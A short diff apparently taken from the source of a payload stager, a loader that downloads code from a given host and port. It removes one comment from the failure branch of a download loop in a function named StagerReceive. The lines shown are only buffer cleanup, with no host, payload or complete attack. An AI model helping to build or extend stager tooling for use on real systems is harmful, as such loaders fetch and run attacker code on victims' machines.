@@ -57,7 +57,7 @@ void StagerReceive(INSTANCE pInstance, _In_ LPWSTR Host, _In_ int Port, _In_ LPW
             dwDownloaded += dwSize;
         } else {
             pInstance.Api.pRtlFreeHeap(Heap, 0, pTempBuffer);
-            pTempBuffer = NULL; // Ensure pTempBuffer is NULL if allocation fails
+            pTempBuffer = NULL;
             goto END;
         }
     } while (dwSize > 0 && dwDownloaded < dwContentLength);
